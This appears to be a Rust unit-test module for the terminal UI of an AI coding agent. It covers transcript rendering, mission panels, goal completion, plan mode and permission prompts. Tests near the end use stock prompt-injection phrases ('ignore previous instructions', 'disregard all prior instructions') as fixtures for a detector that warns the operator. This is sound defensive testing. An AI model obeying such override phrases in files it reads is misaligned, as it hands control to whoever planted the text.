    fn task(id: u32, text: &str, status: TaskStatus) -> Task {
        Task {
            id,
            text: text.to_string(),
            status,
        }
    }

    fn mission_step(id: u32, member: &str, task: &str, status: StepStatus) -> MissionStep {
        MissionStep {
            id,
            member: member.to_string(),
            task: task.to_string(),
            status,
            notes: None,
        }
    }

    fn tool_call(id: &str, name: &str) -> aivyx_types::ToolCall {
        aivyx_types::ToolCall {
            id: aivyx_types::ToolCallId(id.to_string()),
            name: name.to_string(),
            arguments: serde_json::json!({}),
            source: aivyx_types::ToolCallSource::Native,
        }
    }

    #[test]
    fn sub_agent_text_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::TextDelta("exploring the auth module".to_string()),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text == "exploring the auth module"
        ));
    }

    #[test]
    fn sub_agent_tool_call_is_prefixed_and_still_distinguished() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::ToolCallDetected(tool_call("c1", "read_file")),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text.contains("read_file")
        ));
    }

    #[test]
    fn architect_note_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ArchitectNote(
            "plan from model-architect:\n1. Add TokenV2.".to_string(),
        ));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::Architect(text)) if text.contains("Add TokenV2")
        ));

        let lines = chat_line_to_lines(app.transcript.last().unwrap());
        assert!(lines[0].to_string().starts_with("architect> "));
    }

    #[test]
    fn reasoning_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ReasoningDelta(
            "considering the edge cases".to_string(),
        ));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::Reasoning(text)) if text == "considering the edge cases"
        ));

        let lines = chat_line_to_lines(app.transcript.last().unwrap());
        assert!(lines[0].to_string().contains("thinking:"));
    }

    #[test]
    fn reasoning_then_text_delta_starts_a_fresh_assistant_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ReasoningDelta("hmm".to_string()));
        app.handle_agent_event(AgentEvent::ReasoningDelta(", let me see".to_string()));
        app.handle_agent_event(AgentEvent::TextDelta("Here's the answer".to_string()));

        assert_eq!(app.transcript.len(), 2);
        assert!(matches!(
            &app.transcript[0],
            ChatLine::Reasoning(text) if text == "hmm, let me see"
        ));
        assert!(matches!(
            &app.transcript[1],
            ChatLine::Assistant(text) if text == "Here's the answer"
        ));
    }

    #[test]
    fn sub_agent_reasoning_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::ReasoningDelta("weighing two approaches".to_string()),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text == "weighing two approaches"
        ));
    }

    #[test]
    fn seed_transcript_rebuilds_user_assistant_and_tool_lines() {
        use aivyx_types::{ToolCall, ToolCallId, ToolCallSource, ToolResult};

        let history = vec![
            Message::text(Role::User, "read foo"),
            Message {
                role: Role::Assistant,
                content: vec![
                    ContentBlock::Text("looking".to_string()),
                    ContentBlock::ToolCall(ToolCall {
                        id: ToolCallId("c1".to_string()),
                        name: "read_file".to_string(),
                        arguments: serde_json::json!({"path": "foo"}),
                        source: ToolCallSource::Native,
                    }),
                ],
                tool_call_id: None,
            },
            Message {
                role: Role::Tool,
                tool_call_id: Some(ToolCallId("c1".to_string())),
                content: vec![ContentBlock::ToolResult(ToolResult {
                    call_id: ToolCallId("c1".to_string()),
                    output: ToolOutput::Denied("nope".to_string()),
                })],
            },
        ];

        let lines = seed_transcript(&history);

        assert_eq!(lines.len(), 4);
        assert!(matches!(&lines[0], ChatLine::User(t) if t == "read foo"));
        assert!(matches!(&lines[1], ChatLine::Assistant(t) if t == "looking"));
        assert!(matches!(&lines[2], ChatLine::ToolCall(t) if t.starts_with("read_file(")));
        assert!(matches!(&lines[3], ChatLine::ToolResult(t) if t == "denied: nope"));
    }

    #[test]
    fn task_window_shows_everything_when_it_fits() {
        let tasks = vec![
            task(1, "a", TaskStatus::Done),
            task(2, "b", TaskStatus::Pending),
        ];
        assert_eq!(task_window(&tasks, 6).len(), 2);
    }

    #[test]
    fn task_window_skips_a_leading_run_of_done_tasks() {
        let mut tasks: Vec<Task> = (1..=6).map(|i| task(i, "done", TaskStatus::Done)).collect();
        tasks.push(task(7, "current", TaskStatus::InProgress));
        tasks.push(task(8, "next", TaskStatus::Pending));

        let window = task_window(&tasks, 6);

        assert_eq!(window.len(), 6);
        // The window is clamped to stay full, so it starts before the first
        // unfinished task here — but the unfinished tail must be visible.
        assert!(window.iter().any(|t| t.text == "current"));
        assert!(window.iter().any(|t| t.text == "next"));
    }

    #[test]
    fn task_window_of_all_done_tasks_shows_the_head() {
        let tasks: Vec<Task> = (1..=9).map(|i| task(i, "done", TaskStatus::Done)).collect();
        let window = task_window(&tasks, 6);
        assert_eq!(window.len(), 6);
        assert_eq!(window[0].id, 1);
    }

    #[test]
    fn missions_updated_stores_the_new_plan() {
        let mut app = App::new(None, PlanMode::new());
        let plan = MissionPlan {
            mission: "fix the bug".to_string(),
            steps: vec![mission_step(
                1,
                "implementer",
                "write the fix",
                StepStatus::Pending,
            )],
            summary: None,
        };
        app.handle_agent_event(AgentEvent::MissionsUpdated(plan.clone()));
        assert_eq!(app.mission_plan, Some(plan));
    }

    #[test]
    fn specialist_sessions_updated_stores_the_new_list() {
        let mut app = App::new(None, PlanMode::new());
        let sessions = vec![SpecialistSessionSummary {
            session_id: "abc123".to_string(),
            member: "implementer".to_string(),
        }];
        app.handle_agent_event(AgentEvent::SpecialistSessionsUpdated(sessions.clone()));
        assert_eq!(app.open_specialist_sessions, sessions);
    }

    #[test]
    fn conversation_cleared_resets_mission_state() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::MissionsUpdated(MissionPlan {
            mission: "fix the bug".to_string(),
            steps: vec![mission_step(
                1,
                "implementer",
                "write the fix",
                StepStatus::Pending,
            )],
            summary: None,
        }));
        app.handle_agent_event(AgentEvent::SpecialistSessionsUpdated(vec![
            SpecialistSessionSummary {
                session_id: "abc123".to_string(),
                member: "implementer".to_string(),
            },
        ]));

        app.handle_agent_event(AgentEvent::ConversationCleared);

        assert_eq!(app.mission_plan, None);
        assert!(app.open_specialist_sessions.is_empty());
    }

    #[test]
    fn mission_panel_height_is_zero_with_no_plan_and_no_sessions() {
        assert_eq!(mission_panel_height(None, &[]), 0);
    }

    #[test]
    fn mission_panel_height_is_nonzero_for_a_plan_with_zero_steps() {
        // Regression test: `decompose_task` can produce a `MissionPlan`
        // whose `steps` is empty (an edge case), which previously hid the
        // panel entirely because the old condition checked step count
        // rather than `Option` presence. `mission_plan.is_some()` must be
        // enough to show the panel, independent of how many steps it has.
        let plan = MissionPlan {
            mission: "fix the bug".to_string(),
            steps: vec![],
            summary: None,
        };
        assert!(mission_panel_height(Some(&plan), &[]) > 0);
    }

    #[test]
    fn mission_panel_height_is_nonzero_for_open_sessions_with_no_plan() {
        let sessions = vec![SpecialistSessionSummary {
            session_id: "abc123".to_string(),
            member: "implementer".to_string(),
        }];
        assert!(mission_panel_height(None, &sessions) > 0);
    }

    #[test]
    fn mission_step_window_shows_everything_when_it_fits() {
        let steps = vec![
            mission_step(1, "implementer", "a", StepStatus::Verified),
            mission_step(2, "implementer", "b", StepStatus::Pending),
        ];
        assert_eq!(mission_step_window(&steps, 6).len(), 2);
    }

    #[test]
    fn mission_step_window_skips_a_leading_run_of_verified_steps() {
        let mut steps: Vec<MissionStep> = (1..=6)
            .map(|i| mission_step(i, "implementer", "done", StepStatus::Verified))
            .collect();
        steps.push(mission_step(
            7,
            "implementer",
            "current",
            StepStatus::Pending,
        ));
        steps.push(mission_step(8, "implementer", "next", StepStatus::Pending));

        let window = mission_step_window(&steps, 6);

        assert_eq!(window.len(), 6);
        assert!(window.iter().any(|s| s.task == "current"));
        assert!(window.iter().any(|s| s.task == "next"));
    }

    #[test]
    fn mission_step_window_of_all_verified_steps_shows_the_head() {
        let steps: Vec<MissionStep> = (1..=9)
            .map(|i| mission_step(i, "implementer", "done", StepStatus::Verified))
            .collect();
        let window = mission_step_window(&steps, 6);
        assert_eq!(window.len(), 6);
        assert_eq!(window[0].id, 1);
    }

    #[test]
    fn mission_step_window_does_not_hide_a_trailing_failed_step() {
        // Regression test: anchoring on the first `Pending` step alone used
        // to miss a `Failed` step entirely once no `Pending` steps remained
        // -- `position` found nothing, fell back to `unwrap_or(0)`, and the
        // window showed the leading run of `Verified` steps instead of the
        // one actionable, red-highlighted `[!]` step at the end. 8 steps
        // `Verified`, the 9th `Failed`, no `Pending` steps at all -- the
        // window must still include the `Failed` step.
        let mut steps: Vec<MissionStep> = (1..=8)
            .map(|i| mission_step(i, "implementer", "done", StepStatus::Verified))
            .collect();
        steps.push(mission_step(9, "implementer", "broke", StepStatus::Failed));

        let window = mission_step_window(&steps, 6);

        assert_eq!(window.len(), 6);
        assert!(
            window.iter().any(|s| s.status == StepStatus::Failed),
            "the trailing Failed step must be visible in the window"
        );
        assert!(window.iter().any(|s| s.task == "broke"));
    }

    #[test]
    fn single_line_command_target_stays_one_line() {
        let target = PermissionTarget::Command {
            program: "cargo".to_string(),
            args: vec!["test".to_string()],
        };
        let lines = target_lines(&target);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].to_string(), "Command: cargo test");
    }

    fn done_task(id: u32) -> Task {
        Task {
            id,
            text: "x".to_string(),
            status: TaskStatus::Done,
        }
    }

    fn pending_task(id: u32) -> Task {
        Task {
            id,
            text: "x".to_string(),
            status: TaskStatus::Pending,
        }
    }

    #[test]
    fn goal_achieved_requires_at_least_one_task_and_all_done() {
        assert!(
            !goal_achieved(&[], None, &[]),
            "no tasks ever set means never done"
        );
        assert!(!goal_achieved(&[done_task(1), pending_task(2)], None, &[]));
        assert!(goal_achieved(&[done_task(1), done_task(2)], None, &[]));
    }

    #[test]
    fn next_autonomous_message_chooses_correctly() {
        assert_eq!(
            next_autonomous_message(true, &[], None, &[]),
            Some("continue".to_string()),
            "a paused turn always continues, regardless of task state"
        );
        assert_eq!(
            next_autonomous_message(false, &[done_task(1)], None, &[]),
            None,
            "goal achieved -> stop"
        );
        assert_eq!(
            next_autonomous_message(false, &[pending_task(1)], None, &[]),
            Some("continue working toward the goal".to_string())
        );
        assert_eq!(
            next_autonomous_message(false, &[], None, &[]),
            Some("continue working toward the goal".to_string()),
            "no tasks ever set -> keep going until budget exhausts, not stuck forever"
        );
    }

    fn mission_with_summary(summary: Option<&str>) -> MissionPlan {
        MissionPlan {
            mission: "test mission".to_string(),
            steps: vec![MissionStep {
                id: 1,
                member: "implementer".to_string(),
                task: "do the thing".to_string(),
                status: StepStatus::Verified,
                notes: None,
            }],
            summary: summary.map(|s| s.to_string()),
        }
    }

    fn open_session(id: &str) -> SpecialistSessionSummary {
        SpecialistSessionSummary {
            session_id: id.to_string(),
            member: "implementer".to_string(),
        }
    }

    #[test]
    fn goal_achieved_requires_synthesize_results_for_a_mission_only_run() {
        let unsynthesized = mission_with_summary(None);
        assert!(
            !goal_achieved(&[], Some(&unsynthesized), &[]),
            "a decomposed mission with no summary yet is not done"
        );
        let synthesized = mission_with_summary(Some("final deliverable"));
        assert!(
            goal_achieved(&[], Some(&synthesized), &[]),
            "synthesize_results having been called is enough on its own, no set_tasks needed"
        );
    }

    #[test]
    fn goal_achieved_requires_both_tasks_and_mission_when_both_are_used() {
        let synthesized = mission_with_summary(Some("final deliverable"));
        assert!(
            !goal_achieved(&[pending_task(1)], Some(&synthesized), &[]),
            "mission synthesized but a set_tasks task is still pending -> not done"
        );
        assert!(
            goal_achieved(&[done_task(1)], Some(&synthesized), &[]),
            "both signals satisfied -> done"
        );
    }

    #[test]
    fn goal_achieved_blocks_on_any_open_specialist_session_regardless_of_other_signals() {
        let synthesized = mission_with_summary(Some("final deliverable"));
        assert!(
            !goal_achieved(&[done_task(1)], Some(&synthesized), &[open_session("s1")]),
            "an open specialist session always blocks completion"
        );
        assert!(
            !goal_achieved(&[], None, &[open_session("s1")]),
            "even with no tasks or mission ever used, an open session blocks"
        );
    }

    #[test]
    fn goal_achieved_team_disabled_matches_original_behavior_exactly() {
        // [team] enabled = false means mission_plan is always None and
        // open_specialist_sessions is always empty -- confirms the 3-arg
        // function reduces to the original 1-arg behavior byte-for-byte.
        assert!(!goal_achieved(&[], None, &[]));
        assert!(!goal_achieved(&[done_task(1), pending_task(2)], None, &[]));
        assert!(goal_achieved(&[done_task(1), done_task(2)], None, &[]));
    }

    #[test]
    fn goal_achieved_ignores_a_never_decomposed_pristine_mission_plan() {
        // [team] enabled = true constructs a placeholder MissionPlan eagerly,
        // even if decompose_task is never called this run -- must not be
        // mistaken for "mission used but incomplete."
        let pristine = MissionPlan {
            mission: String::new(),
            steps: vec![],
            summary: None,
        };
        assert!(
            goal_achieved(&[done_task(1)], Some(&pristine), &[]),
            "a never-decomposed MissionPlan must not block a tasks-only completion"
        );
        assert!(
            !goal_achieved(&[], Some(&pristine), &[]),
            "still correctly not done with no tasks and no real mission either"
        );
    }

    // The driver loop that actually calls `agent.notify(...)` lives inside a
    // `tokio::spawn`ed closure in `run()`, driving a real `Agent` through
    // `run_turn` — it isn't a pure function, and constructing a real `Agent`
    // here would require pulling in `aivyx-llm` (for a mock `LlmBackend`)
    // and `aivyx-tools` (for `ToolExecutor`), neither of which is a
    // dependency of this crate today. So instead these tests pin down the
    // three notice-message builders the loop calls at each stop point —
    // together with `goal_achieved`/`next_autonomous_message` above (which
    // already cover *when* each path fires), this is what's practically
    // testable without adding new test-only dependencies for one call site
    // each.

    #[test]
    fn budget_exhausted_notice_reports_iterations_and_task_progress() {
        let tasks = vec![done_task(1), done_task(2), pending_task(3)];
        let message = budget_exhausted_notice(5, &tasks);
        assert!(message.contains("budget exhausted"));
        assert!(message.contains('5'));
        assert!(message.contains("2/3 tasks done"));
    }

    #[test]
    fn budget_exhausted_notice_handles_no_tasks_ever_set() {
        let message = budget_exhausted_notice(3, &[]);
        assert!(message.contains("0/0 tasks done"));
    }

    #[test]
    fn cancelled_notice_reports_iterations() {
        let message = cancelled_notice(2);
        assert!(message.contains("cancelled by user"));
        assert!(message.contains('2'));
    }

    #[test]
    fn a_cancelled_turn_marker_renders_as_a_dim_cancelled_line_not_a_notice() {
        // U3: the interactive background task reports a mid-stream Ctrl+C
        // via `agent.notify(CANCELLED_TURN_MARKER)` -- same bridge as any
        // other notice -- but it must render distinctly, not as a red/bold
        // error.
        let mut app = App::new(None, PlanMode::new());
        app.streaming_active = true;
        app.transcript.push(ChatLine::Assistant("partial ans".to_string()));

        app.handle_agent_event(AgentEvent::Error(CANCELLED_TURN_MARKER.to_string()));

        assert!(!app.streaming_active);
        assert!(matches!(app.transcript.last(), Some(ChatLine::Cancelled(_))));
        let Some(ChatLine::Cancelled(text)) = app.transcript.last() else {
            unreachable!()
        };
        assert_eq!(text, CANCELLED_TURN_MARKER);
    }

    #[test]
    fn plan_mode_turn_notice_only_fires_when_both_plan_mode_and_real_activity() {
        assert!(plan_mode_turn_notice(true, true, false).is_some());
        assert_eq!(plan_mode_turn_notice(true, false, false), None);
        assert_eq!(plan_mode_turn_notice(false, true, false), None);
        assert_eq!(plan_mode_turn_notice(false, false, false), None);
        assert!(
            plan_mode_turn_notice(true, true, false)
                .unwrap()
                .contains("Ctrl+P")
        );
    }

    #[test]
    fn plan_mode_turn_notice_is_suppressed_for_a_cancelled_turn() {
        // Fix round 1 (Important): a cancelled turn already gets U3's own
        // "— stopped (Ctrl+C)" marker -- showing the plan-mode reminder
        // too made it look like two different things happened.
        assert_eq!(plan_mode_turn_notice(true, true, true), None);
        // Plan mode + real activity + NOT cancelled must still show it.
        assert!(plan_mode_turn_notice(true, true, false).is_some());
    }

    #[test]
    fn a_cancelled_plan_mode_turn_shows_only_the_cancelled_marker_not_the_plan_notice() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.push_user_message("do the thing".to_string());
        app.handle_agent_event(AgentEvent::TextDelta("partial".to_string()));
        app.cancel_requested = true;

        app.handle_agent_event(AgentEvent::TurnComplete);
        app.handle_agent_event(AgentEvent::Error(CANCELLED_TURN_MARKER.to_string()));

        assert!(
            !app.transcript
                .iter()
                .any(|line| matches!(line, ChatLine::Notice(text) if text.contains("Plan mode"))),
            "the plan-mode reminder must not appear on a cancelled turn"
        );
        assert!(
            app.transcript
                .iter()
                .any(|line| matches!(line, ChatLine::Cancelled(_))),
            "the cancelled marker must still appear"
        );
    }

    #[test]
    fn a_non_cancelled_plan_mode_turn_still_shows_the_plan_notice() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.push_user_message("do the thing".to_string());
        app.handle_agent_event(AgentEvent::TextDelta("sure, here's the plan".to_string()));

        app.handle_agent_event(AgentEvent::TurnComplete);

        assert!(
            app.transcript
                .iter()
                .any(|line| matches!(line, ChatLine::Notice(text) if text.contains("Plan mode"))),
            "the plan-mode reminder must still appear when the turn wasn't cancelled"
        );
    }

    #[test]
    fn plan_approval_message_only_fires_on_off_with_pending_tasks_and_an_idle_turn() {
        // The one true case: this toggle just turned plan mode off, there
        // are pending tasks to carry out, and nothing is already running.
        assert!(plan_approval_message(true, true, true).is_some());
        // Toggling it ON (plan_mode_was_on == false) never auto-sends.
        assert_eq!(plan_approval_message(false, true, true), None);
        // No tasks -- keep today's behaviour (just the toggle notice).
        assert_eq!(plan_approval_message(true, false, true), None);
        // A turn is already running -- don't interrupt it.
        assert_eq!(plan_approval_message(true, true, false), None);
    }

    #[test]
    fn ctrl_p_approving_a_pending_plan_sends_the_approval_message_as_a_user_turn() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.tasks = vec![Task {
            id: 1,
            text: "step one".to_string(),
            status: TaskStatus::Pending,
        }];

        let sent = app.toggle_plan_mode_and_maybe_approve();

        assert!(!app.plan_mode.active());
        assert_eq!(sent, Some(PLAN_APPROVED_MESSAGE.to_string()));
        assert!(matches!(app.transcript.last(), Some(ChatLine::User(text)) if text == PLAN_APPROVED_MESSAGE));
        assert!(app.streaming_active, "sending it must start a real turn");
    }

    #[test]
    fn ctrl_p_with_no_tasks_only_shows_the_toggle_notice() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);

        let sent = app.toggle_plan_mode_and_maybe_approve();

        assert_eq!(sent, None);
        assert!(!app.plan_mode.active());
        assert!(matches!(app.transcript.last(), Some(ChatLine::Notice(_))));
    }

    #[test]
    fn ctrl_p_while_a_turn_is_already_running_does_not_auto_send() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.tasks = vec![Task {
            id: 1,
            text: "step one".to_string(),
            status: TaskStatus::Pending,
        }];
        app.streaming_active = true;

        let sent = app.toggle_plan_mode_and_maybe_approve();

        assert_eq!(sent, None);
    }

    #[test]
    fn ctrl_p_turning_plan_mode_on_never_auto_sends_even_with_pending_tasks() {
        let mut app = App::new(None, PlanMode::new());
        app.tasks = vec![Task {
            id: 1,
            text: "step one".to_string(),
            status: TaskStatus::Pending,
        }];
        assert!(!app.plan_mode.active());

        let sent = app.toggle_plan_mode_and_maybe_approve();

        assert_eq!(sent, None);
        assert!(app.plan_mode.active());
    }

    #[test]
    fn a_turn_complete_in_plan_mode_with_real_model_activity_adds_the_reminder() {
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.push_user_message("do the thing".to_string());
        app.handle_agent_event(AgentEvent::TextDelta("sure, here's the plan".to_string()));

        app.handle_agent_event(AgentEvent::TurnComplete);

        let Some(ChatLine::Notice(text)) = app.transcript.last() else {
            panic!("expected a Notice line as the last transcript entry");
        };
        assert!(text.contains("Plan mode"));
        assert!(text.contains("Ctrl+P"));
    }

    #[test]
    fn a_turn_complete_in_plan_mode_with_no_model_activity_adds_no_reminder() {
        // A command-only turn (e.g. /models) calls run_turn and still gets
        // a real TurnComplete, but never touches the model -- plan mode
        // being on is irrelevant to it.
        let mut app = App::new(None, PlanMode::new());
        app.plan_mode.set_active(true);
        app.push_user_message("/models".to_string());
        let len_before = app.transcript.len();

        app.handle_agent_event(AgentEvent::TurnComplete);

        assert_eq!(app.transcript.len(), len_before);
    }

    #[test]
    fn a_turn_complete_outside_plan_mode_adds_no_reminder() {
        let mut app = App::new(None, PlanMode::new());
        app.push_user_message("do the thing".to_string());
        app.handle_agent_event(AgentEvent::TextDelta("done".to_string()));
        let len_before = app.transcript.len();

        app.handle_agent_event(AgentEvent::TurnComplete);

        assert_eq!(app.transcript.len(), len_before);
    }

    #[test]
    fn a_real_error_still_renders_as_a_notice() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::Error("backend timed out".to_string()));
        assert!(matches!(app.transcript.last(), Some(ChatLine::Notice(_))));
    }

    #[test]
    fn cancelled_chat_line_has_no_notice_prefix() {
        let lines = chat_line_to_lines(&ChatLine::Cancelled(CANCELLED_TURN_MARKER.to_string()));
        let rendered: String = lines
            .iter()
            .flat_map(|l| l.spans.iter())
            .map(|s| s.content.as_ref())
            .collect();
        assert!(rendered.contains("stopped"));
        assert!(!rendered.contains('!'));
    }

    #[test]
    fn goal_achieved_notice_reports_iterations() {
        let message = goal_achieved_notice(4);
        assert!(message.contains("goal achieved"));
        assert!(message.contains('4'));
    }

    #[test]
    fn injection_detected_notice_reports_iterations_source_and_pattern() {
        let finding = InjectionFinding {
            source: "read_file: notes.txt".to_string(),
            matched_pattern: "ignore previous instructions".to_string(),
            excerpt: "...IGNORE PREVIOUS INSTRUCTIONS...".to_string(),
        };
        let message = injection_detected_notice(3, &finding);
        assert!(message.contains("possible prompt injection"));
        assert!(message.contains('3'));
        assert!(message.contains("read_file: notes.txt"));
        assert!(message.contains("ignore previous instructions"));
    }

    #[test]
    fn interactive_injection_notice_names_the_flagged_source_and_pattern() {
        let finding = InjectionFinding {
            source: "read_file: notes.txt".to_string(),
            matched_pattern: "ignore previous instructions".to_string(),
            excerpt: "...IGNORE PREVIOUS INSTRUCTIONS...".to_string(),
        };
        let message = interactive_injection_notice(&finding);
        assert!(message.contains("flagged as a likely prompt injection"));
        assert!(message.contains("read_file: notes.txt"));
        assert!(message.contains("ignore previous instructions"));
        // Unlike the autonomous notice, this one never claims anything was
        // stopped -- interactive mode doesn't halt on this.
        assert!(!message.contains("stopped"));
    }

    // Regression coverage for the interactive-mode gap this task fixes:
    // `record_tool_result` scans and flags shared injection taint
    // regardless of mode, but before this fix nothing in interactive mode
    // ever surfaced a flagged finding to the operator. The real peek lives
    // inside `run()`'s spawned background task (a closure capturing a live
    // `Agent`/backend/channels, not a pure function -- see this file's own
    // note above `budget_exhausted_notice` on why the driver loops
    // themselves aren't unit-tested directly), so this exercises the two
    // pieces that *are* extractable and load-bearing for the operator
    // actually seeing the warning: the notice text (above) and that a
    // Notice-classed `AgentEvent::Error` carrying it renders as a visible
    // line in the transcript, matching every other status/warning line in
    // this TUI (e.g. `show_help_lists_every_known_command...` below).
    #[test]
    fn interactive_mode_surfaces_a_visible_warning_when_a_turn_ingested_flagged_content() {
        let finding = InjectionFinding {
            source: "grep: vendor/README.md".to_string(),
            matched_pattern: "disregard all prior".to_string(),
            excerpt: "...disregard all prior instructions...".to_string(),
        };

        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::Error(interactive_injection_notice(&finding)));

        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal.draw(|frame| app.render(frame)).unwrap();
        let rendered = render_to_string(&terminal);

        assert!(
            rendered.contains("grep: vendor/README.md"),
            "expected the flagged source to be visible in the rendered transcript:\n{rendered}"
        );
        assert!(
            rendered.contains("flagged as a likely prompt injection"),
            "expected a recognizable warning in the rendered transcript:\n{rendered}"
        );
    }

    fn modal_request() -> (
        crate::permission::ModalRequest,
        oneshot::Receiver<UserResponse>,
    ) {
        let (reply_tx, reply_rx) = oneshot::channel();
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/example.rs")),
            arguments_preview: serde_json::json!({}),
            preview: None,
            diff: None,
        };
        (
            crate::permission::ModalRequest { request, reply_tx },
            reply_rx,
        )
    }

    #[test]
    fn pending_permission_is_stale_false_when_nothing_pending() {
        let app = App::new(None, PlanMode::new());
        assert!(!app.pending_permission_is_stale());
    }

    #[test]
    fn pending_permission_is_stale_false_while_receiver_alive() {
        let mut app = App::new(None, PlanMode::new());
        let (modal, reply_rx) = modal_request();
        app.pending_permission = Some(modal);

        assert!(!app.pending_permission_is_stale());
        drop(reply_rx); // keep the receiver alive through the assertion above
    }

    #[test]
    fn pending_permission_is_stale_true_once_editor_answers_and_drops_receiver() {
        let mut app = App::new(None, PlanMode::new());
        let (modal, reply_rx) = modal_request();
        app.pending_permission = Some(modal);

        // Simulate the editor-approval race winning: the other side of
        // ConfirmationGate's select! already got its answer and dropped its
        // receiver, closing this modal's reply channel.
        drop(reply_rx);

        assert!(app.pending_permission_is_stale());
    }

    #[test]
    fn conversation_cleared_event_resets_transcript_tasks_and_context_usage() {
        let mut app = App::new(None, PlanMode::new());
        app.transcript.push(ChatLine::User("hi".to_string()));
        app.transcript
            .push(ChatLine::Assistant("hello".to_string()));
        app.tasks.push(Task {
            id: 1,
            text: "a task".to_string(),
            status: TaskStatus::Pending,
        });
        app.context_usage = Some((100, 1000));
        app.streaming_active = true;

        app.handle_agent_event(AgentEvent::ConversationCleared);

        assert!(app.transcript.is_empty());
        assert!(app.tasks.is_empty());
        assert_eq!(app.context_usage, None);
        assert!(!app.streaming_active);
    }

    #[test]
    fn show_help_lists_every_known_command_with_its_description() {
        let mut app = App::new(None, PlanMode::new());
        app.show_help();

        assert_eq!(app.transcript.len(), 1);
        let ChatLine::Help(text) = &app.transcript[0] else {
            panic!("expected a Help line, not a Notice (U4/U5: /help must not read as an error)");
        };
        for cmd in aivyx_core::commands::COMMANDS {
            assert!(
                text.contains(cmd.name) && text.contains(cmd.description),
                "help text missing {}: {text}",
                cmd.name
            );
        }
    }

    #[test]
    fn help_text_lists_real_keybindings_and_the_undo_commands() {
        let text = help_text();
        assert!(text.contains("Keys:"));
        assert!(text.contains("Enter") && text.contains("send"));
        assert!(text.contains("Ctrl+C") && text.contains("cancel a reply"));
        assert!(text.contains("Ctrl+P") && text.contains("plan mode on/off"));
        assert!(text.contains("y / a / n"));
        // No scrolling keybinding exists in the input loop -- must not be
        // claimed.
        assert!(!text.to_lowercase().contains("scroll"));
        // Undo is an in-app command now, not a pointer to the README.
        assert!(text.contains("/undo") && text.contains("/redo") && text.contains("/checkpoints"));
        assert!(!text.contains("Worktree checkpoints"));
    }

    #[test]
    fn a_help_chat_line_renders_with_no_notice_prefix() {
        // U4/U5: the generic "! " notice prefix must not appear on /help
        // output -- only `ChatLine::Notice` gets that treatment.
        let lines = chat_line_to_lines(&ChatLine::Help("Available commands:\nfoo".to_string()));
        for line in &lines {
            let rendered: String = line.spans.iter().map(|s| s.content.as_ref()).collect();
            assert!(!rendered.contains('!'), "unexpected '!' in: {rendered}");
        }
    }

    #[test]
    fn command_hint_matches_narrows_as_the_user_types_and_stops_after_a_space() {
        let mut app = App::new(None, PlanMode::new());
        assert!(
            app.command_hint_matches().is_empty(),
            "empty input has no hints"
        );

        app.input.insert_str("/");
        assert_eq!(
            app.command_hint_matches().len(),
            aivyx_core::commands::COMMANDS.len()
        );

        app.input.insert_str("cl");
        let matches = app.command_hint_matches();
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "/clear");

        app.input.insert_str(" ");
        assert!(
            app.command_hint_matches().is_empty(),
            "a space means the command name is done being composed"
        );
    }

    #[test]
    fn command_hint_matches_is_empty_for_plain_text() {
        let mut app = App::new(None, PlanMode::new());
        app.input.insert_str("fix the bug");
        assert!(app.command_hint_matches().is_empty());
    }

    #[test]
    fn command_hint_rect_sits_directly_above_the_input_area_and_never_goes_negative() {
        let input_area = Rect {
            x: 0,
            y: 10,
            width: 80,
            height: 3,
        };
        let rect = command_hint_rect(input_area, 2);
        assert_eq!(rect.height, 4); // 2 matches + 2 borders
        assert_eq!(rect.y, 6); // 10 - 4
        assert_eq!(rect.x, input_area.x);
        assert_eq!(rect.width, input_area.width);

        // Near the top of the frame: must clamp, not underflow/panic.
        let near_top = Rect {
            x: 0,
            y: 1,
            width: 80,
            height: 3,
        };
        let clamped = command_hint_rect(near_top, 6);
        assert_eq!(clamped.y, 0);
    }
}
